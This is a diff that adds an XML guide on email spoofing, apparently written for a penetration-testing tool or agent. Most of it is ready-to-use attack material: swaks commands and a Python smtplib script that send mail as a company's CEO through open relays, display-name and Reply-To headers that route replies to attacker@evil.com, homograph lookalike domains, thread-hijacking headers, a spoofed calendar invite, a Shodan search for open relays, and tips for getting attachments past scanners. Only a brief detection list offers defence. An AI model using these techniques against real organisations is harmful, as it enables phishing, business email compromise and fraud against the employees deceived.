@@ -1,0 +1,257 @@
+<vulnerability_guide>
+  <title>EMAIL SPOOFING TECHNIQUES</title>
+
+  <critical>Email spoofing impersonates trusted senders to deceive recipients. Despite SPF, DKIM, and DMARC, many techniques still work: display name abuse, lookalike domains, compromised email servers, and exploiting misconfigurations. Successful spoofing enables phishing, business email compromise, and social engineering at scale.</critical>
+
+  <scope>
+    - Direct sender spoofing
+    - Display name abuse
+    - Lookalike domain attacks
+    - Reply-To manipulation
+    - Email relay abuse
+    - Header manipulation
+  </scope>
+
+  <methodology>
+    1. TARGET RECONNAISSANCE
+       {% raw %}
+       # Analyze target's email security
+       # Check SPF
+       dig target.com TXT | grep spf
+
+       # Check DKIM (try common selectors)
+       for s in default selector1 selector2 google mail dkim; do
+           dig ${s}._domainkey.target.com TXT
+       done
+
+       # Check DMARC
+       dig _dmarc.target.com TXT
+
+       # Interpretation:
+       # No SPF + No DMARC = Easily spoofable
+       # SPF ~all + DMARC p=none = Likely spoofable
+       # SPF -all + DMARC p=reject = Harder, try alternatives
+       {% endraw %}
+
+    2. DIRECT SPOOFING
+       {% raw %}
+       # If no email authentication
+
+       # Using swaks (Swiss Army Knife for SMTP)
+       swaks --to victim@target.com \
+             --from ceo@target.com \
+             --server mx.recipient.com \
+             --header "Subject: Urgent Request"
+
+       # Using Python
+       import smtplib
+       from email.mime.text import MIMEText
+
+       msg = MIMEText("Phishing content")
+       msg['Subject'] = "Urgent: Action Required"
+       msg['From'] = "ceo@target.com"
+       msg['To'] = "employee@target.com"
+
+       s = smtplib.SMTP('open-relay.example.com')
+       s.sendmail("ceo@target.com", ["employee@target.com"], msg.as_string())
+
+       # Note: Requires open relay or no authentication on recipient's MX
+       {% endraw %}
+
+    3. DISPLAY NAME SPOOFING
+       {% raw %}
+       # Works even with perfect SPF/DKIM/DMARC
+
+       # Technique 1: Name with email address
+       From: "CEO Name <ceo@company.com>" <attacker@evil.com>
+
+       # Technique 2: Just the name
+       From: "Company IT Support" <attacker@evil.com>
+
+       # Technique 3: Name with fake email in name
+       From: "support@company.com" <attacker@evil.com>
+
+       # Most email clients show display name prominently
+       # Actual email address may be hidden or small
+
+       # swaks command
+       swaks --to victim@company.com \
+             --from "CEO <ceo@company.com>" \
+             --h-From "CEO <ceo@company.com>" \
+             --header "Reply-To: attacker@evil.com"
+       {% endraw %}
+
+    4. LOOKALIKE DOMAINS
+       {% raw %}
+       # Register similar domain
+
+       # Typosquatting
+       # company.com -> compnay.com, comapny.com
+
+       # Homograph attacks
+       # company.com -> cоmpany.com (Cyrillic 'о')
+
+       # TLD variations
+       # company.com -> company.co, company.net
+
+       # Subdomain abuse
+       # company.attacker.com
+
+       # Set up proper email authentication
+       # Your lookalike domain will pass SPF/DKIM/DMARC
+       # Because it's YOUR domain
+       {% endraw %}
+
+    5. REPLY-TO ATTACKS
+       {% raw %}
+       # Legitimate sender, malicious reply
+
+       # Email appears from: service@company.com
+       # Replies go to: support@company-help.com (attacker)
+
+       From: service@company.com
+       Reply-To: service@company-help.com
+       Subject: Your recent inquiry
+
+       # User replies with sensitive info
+       # Goes to attacker
+
+       # Works well with:
+       # - Customer support spoofing
+       # - HR impersonation
+       # - Vendor fraud
+       {% endraw %}
+  </methodology>
+
+  <advanced_techniques>
+    <open_relay_exploitation>
+      {% raw %}
+      # Find open mail relays
+
+      # Test for open relay
+      swaks --to external@example.com \
+            --from spoofed@target.com \
+            --server potential-relay.com
+
+      # If relay accepts without auth
+      # Can send as anyone
+
+      # Search for open relays
+      # Shodan: port:25 "220" "ESMTP"
+      # Check if accepts MAIL FROM with your domain
+      {% endraw %}
+    </open_relay_exploitation>
+
+    <internal_spoofing>
+      {% raw %}
+      # Spoof internal senders
+
+      # If inside network or VPN:
+      # Internal mail may have no SPF checks
+
+      # Target internal-only systems
+      # Often trust internal email implicitly
+
+      # Abuse mail applications
+      # Self-hosted webmail may have lax validation
+
+      # Internal phishing:
+      From: hr@internal.company.com
+      Subject: Updated benefits enrollment
+      {% endraw %}
+    </internal_spoofing>
+
+    <email_thread_hijacking>
+      {% raw %}
+      # Insert into existing email threads
+
+      # Requirements:
+      # - Know thread subject/Message-ID
+      # - Match thread formatting
+
+      # Headers to include:
+      In-Reply-To: <original-message-id>
+      References: <original-message-id>
+      Subject: Re: Original Subject
+
+      # Email appears as reply in thread
+      # Inherits trust of original conversation
+
+      # Often used in BEC attacks
+      # After monitoring email (via compromise)
+      {% endraw %}
+    </email_thread_hijacking>
+
+    <calendar_invite_spoofing>
+      {% raw %}
+      # Calendar invites often bypass filters
+
+      # Send calendar invite from spoofed address
+      # Appears in calendar with sender's name
+
+      # iCalendar format
+      Content-Type: text/calendar; method=REQUEST
+
+      BEGIN:VCALENDAR
+      PRODID:-//Evil//EN
+      METHOD:REQUEST
+      BEGIN:VEVENT
+      ORGANIZER:mailto:ceo@company.com
+      SUMMARY:Urgent: Board Meeting
+      DTSTART:20241220T140000Z
+      DTEND:20241220T150000Z
+      ATTENDEE:mailto:victim@company.com
+      END:VEVENT
+      END:VCALENDAR
+
+      # Invite appears from CEO
+      # May include link to "meeting" (phishing)
+      {% endraw %}
+    </calendar_invite_spoofing>
+
+    <attachment_exploitation>
+      {% raw %}
+      # Attach malicious files
+
+      # Common social engineering files:
+      # - "Invoice.pdf" (with exploits)
+      # - "Document.docm" (macros)
+      # - "Report.html" (credential harvesting)
+
+      # ZIP with password (bypasses scanning)
+      # Password in email body
+
+      # .eml attachment (email within email)
+      # Contains original headers
+      # May confuse filters
+      {% endraw %}
+    </attachment_exploitation>
+  </advanced_techniques>
+
+  <detection>
+    - Implement strict DMARC policy
+    - Check sender authenticity for financial requests
+    - Train users on display name vs actual address
+    - Monitor for lookalike domain registrations
+    - Review Reply-To mismatches
+  </detection>
+
+  <validation>
+    - Successfully spoof target domain
+    - Demonstrate display name abuse
+    - Test lookalike domain effectiveness
+    - Document email authentication gaps
+    - Verify spoofed emails are delivered
+  </validation>
+
+  <pro_tips>
+    - Display name spoofing bypasses all technical controls
+    - Lookalike domains pass authentication (they're your domains)
+    - Calendar invites often bypass spam filters
+    - Reply-To attacks capture responses without spoofing From
+    - Internal mail often has weaker validation
+    - Mobile email clients show less sender info
+  </pro_tips>
+
+  <remember>Email spoofing is about trust exploitation. Technical controls (SPF/DKIM/DMARC) only work when properly configured AND when receivers check them. Display name spoofing bypasses everything because it abuses human trust, not technical systems. The most effective email attacks combine technical evasion with social engineering - making the email both deliverable and believable.</remember>
+</vulnerability_guide>
